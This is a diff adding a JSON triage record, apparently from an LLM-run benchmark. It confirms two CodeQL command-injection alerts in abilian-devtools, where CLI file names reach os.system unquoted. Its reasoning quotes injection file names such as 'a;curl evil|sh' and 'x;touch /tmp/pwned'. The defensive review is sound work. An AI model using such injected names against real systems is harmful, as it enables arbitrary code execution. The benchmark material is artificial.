@@ -1,0 +1,87 @@
+{
+  "triage": {
+    "project": "abilian-devtools",
+    "pass": 2,
+    "cwe": "CWE-78 (pass 范围收窄：仅 078，未含 077/088)",
+    "analyst": "independent LLM path review (GLM)",
+    "date": "2026-11-02",
+    "query_id": "py/augur/abilian-devtools/pass2-command-injection",
+    "database": "dataset/codeql_databases/abilian-devtools-db",
+    "sarif": "results/pass2.sarif (2 条正式 path-problem 告警)"
+  },
+  "evidence_source_note": "查询针对 CodeQL DB 创建时快照（abilian-devtools-db/src.zip）运行。已核实：该快照中 main.py:16 为 `result = os.system(cmd)`；而任务给出的磁盘源码树 dataset/codeql_databases/abilian-devtools_vuln/src 中同名文件已无 os.system（改用 shlex.split + subprocess.Popen 列表形式，行号亦不同）——此分歧由 labels.json 元数据预先记录。本次复核以 DB 快照为代码证据（快照已解压至 triage_work/snapshot/ 隔离目录）；磁盘版本仅作分歧事实记录，不作为修复证据解读（未读取修复提交/真值）。dataset 目录下的 cmd_sinks.csv、vulnerability_audit_report*.md、abilian-devtools-safe-db 均为真值材料，已全部避开。",
+
+  "alerts": [
+    {
+      "alert_id": 0,
+      "rule_id": "py/augur/abilian-devtools/pass2-command-injection",
+      "sink_location": "src/abilian/devtools/main.py:14:9",
+      "sink_code": "def run(cmd):  # p2-sink-002：param 级 wrapper sink（cmd 形参，verbatim 转发到 os.system）",
+      "sink_type": "isSink: run 函数形参 0（recall 型 wrapper sink, p2-sink-002, 置信 0.85）",
+      "source_location": "src/abilian/devtools/main.py:22:11 (DB 快照行号)",
+      "source_code": "@app.command()\ndef check(args: list[str]):  # p2-supp-001：Typer CLI 注入的文件/目录名",
+      "source_type": "isSource: check 函数形参 0（Typer @app.command() 处理器, p2-supp-001, 置信 0.8）",
+      "codeflows": [
+        "cf0: main.py:22 args -> :25 arg(循环变量) -> :29 arg(args2.append) -> :29 args2[list.append step] -> :31 args_str(' '.join) -> :33 Fstring(f\"ruff {args_str}\") -> :14 cmd(run 形参)",
+        "cf1: 同上 -> :34 Fstring(f\"flake8 {args_str}\") -> :14 cmd(run 形参)"
+      ],
+      "verdict": "likely_tp",
+      "confidence": "high",
+      "reasoning": {
+        "q1_source_boundary": "成立（按 CLI 威胁模型）。check 是 Typer @app.command() 处理器（console script `adt = abilian.devtools.main:app`），`adt check <names>` 的文件/目录名由 Typer 注入 args 形参。边界是本地 CLI 用户；有实际意义的攻击向量是开发者/自动化对不可信检出的文件名执行 lints（例如克隆仓库中攻击者创建的携带 shell 元字符的文件名，如 `a;curl evil|sh`——存在性过滤反而保证该名字对应真实存在的文件，恰好通过过滤）。无 REST/请求边界。",
+        "q2_propagation_evidence": "全部真实，逐步核实（对 DB 快照）：:25 for arg in args 迭代 -> :29 args2.append(arg)（list.append 内建步）-> :31 ' '.join(args2)（str.join 内建步）-> :33/:34 f-string 插值（格式化字符串步）-> run 形参（过程间传播）。MySummaries 与 MySanitizers 均为 none()，路径中没有任何合成边或人为 taint step——全部为 CodeQL 原生数据流。",
+        "q3_sink_executes_commands": "该 sink 节点本身是 run 的形参（非执行点），但一跳之后（:16）即 `os.system(cmd)` 无条件经 /bin/sh -c 解释。与告警 1 是同一条链的两个 sink 节点（标签设计即如此：param 级 wrapper sink 与 os.system 实参 sink 嵌套，正常情况下同一路径会在两处各报一条）。",
+        "q4_command_content_influenced": "是。args_str 未加引号插值进 f\"ruff {args_str}\" / f\"flake8 {args_str}\"，命令字符串内容直接由 CLI 输入决定。",
+        "q5_sanitization": "无。唯一前置过滤是 Path(arg).exists()（:26，仅存在性检查，不做命令消毒）；typer.secho（:15）只是显示；快照中无 shlex.quote、无白名单、无参数列表。反证查询行为正确：:35 的 run(\"mypy --show-error-codes {args_str}\") 是普通字符串（非 f-string），未被告警命中——与 §7 预测一致。",
+        "q6_business_function": "对指定文件跑 linters 是该工具的核心功能，但把文件名不加引号拼进 shell 字符串不是该功能所需的语义，属实现缺陷。",
+        "q7_overapproximation": "否。Source 模型精确绑定唯一的 check 形参；Sink 模型绑定 os.system 实参 + 已标注的 wrapper 形参；路径真实可达（本地运行 adt check <含元字符文件名> 即触发）。"
+      }
+    },
+    {
+      "alert_id": 1,
+      "rule_id": "py/augur/abilian-devtools/pass2-command-injection",
+      "sink_location": "src/abilian/devtools/main.py:16:24",
+      "sink_code": "result = os.system(cmd)  # p2-sink-001：命令字符串无条件经 /bin/sh -c 解释",
+      "sink_type": "isSink: os.system 实参 0（p2-sink-001, 置信 0.9）",
+      "source_location": "src/abilian/devtools/main.py:22:11 (DB 快照行号)",
+      "source_code": "@app.command() def check(args: list[str])",
+      "source_type": "isSource: check 函数形参 0（p2-supp-001）",
+      "codeflows": [
+        "cf0: main.py:22 args -> :25 arg -> :29 arg/args2[list.append] -> :31 args_str -> :33 Fstring(f\"ruff {args_str}\") -> :14 cmd -> :16 cmd(os.system 实参)",
+        "cf1: 同上 -> :34 Fstring(f\"flake8 {args_str}\") -> :14 cmd -> :16 cmd(os.system 实参)"
+      ],
+      "verdict": "likely_tp",
+      "confidence": "high",
+      "reasoning": {
+        "q1_source_boundary": "同告警 0：Typer CLI 注入的 `adt check` 文件/目录名；本地 CLI 边界，攻击向量是对不可信文件名执行 lints（存在性过滤会放行含元字符的真实文件名）。",
+        "q2_propagation_evidence": "同告警 0，全部为原生数据流步骤，无合成边；本告警额外覆盖最后一跳 run(cmd) -> os.system(cmd)（:16 实参，过程间传播真实）。",
+        "q3_sink_executes_commands": "是。os.system(cmd) 将整个字符串交给 /bin/sh -c，shell 元字符（;、&&、$()、反引号等）全部被解释。",
+        "q4_command_content_influenced": "是。`adt check 'x;touch /tmp/pwned'`（x 需存在）→ args_str='x;touch /tmp/pwned' → os.system('ruff x;touch /tmp/pwned') → 注入命令在 ruff 之后执行。DB 快照 grep 确认 os.system 是库中唯一命令执行调用，无其他竞争路径。",
+        "q5_sanitization": "无任何引用/转义/白名单；Path(arg).exists() 仅过滤不存在的名字。",
+        "q6_business_function": "同告警 0：功能本身合法，缺陷在未引用的 shell 插值实现。",
+        "q7_overapproximation": "否。sink 为无条件 shell 解释的 os.system 实参，source→sink 每一跳都在快照源码中逐行验证存在。"
+      }
+    }
+  ],
+  "summary": {
+    "total_formal_alerts": 2,
+    "likely_tp": 2,
+    "likely_fp": 0,
+    "uncertain": 0,
+    "tp_alert_ids": [0, 1],
+    "notes": [
+      "两条告警是同一污点链（check args -> args_str -> run(f-string) -> os.system）在两个已标注 sink 节点（run 形参 wrapper / os.system 实参）上的重复呈现，均判 likely_tp。",
+      "代码证据全部取自 DB 快照（src.zip），与查询实际分析的代码一致；快照与磁盘树分歧已按 labels.json 元数据处理，磁盘版本未作修复证据使用。",
+      "iris_report.md 当前显示 2 raw / 2 likely TP（main.py:14 与 :16），与现行 SARIF 一致；query_generation_notes.md §10 关于报告仍为零发现的备注已过时（报告显然在其后被重新生成过）。",
+      "诊断查询（diagnostics/pass2_diagnostic.bqrs）结果未作为正式 TP 依据；results/pass2.sarif.empty-backup 已不存在于 results/ 目录。",
+      "本轮未读取 PyVul 漏洞真值（cmd_sinks*.csv、vulnerability_audit_report*.md、abilian-devtools-safe-db）、修复提交和 CVE 公告；未修改原始 SARIF、标签或查询。"
+    ]
+  },
+  "constraints": {
+    "pyvul_ground_truth_read": false,
+    "original_sarif_modified": false,
+    "labels_modified": false,
+    "queries_modified": false,
+    "diagnostic_results_used_as_tp": false
+  }
+}
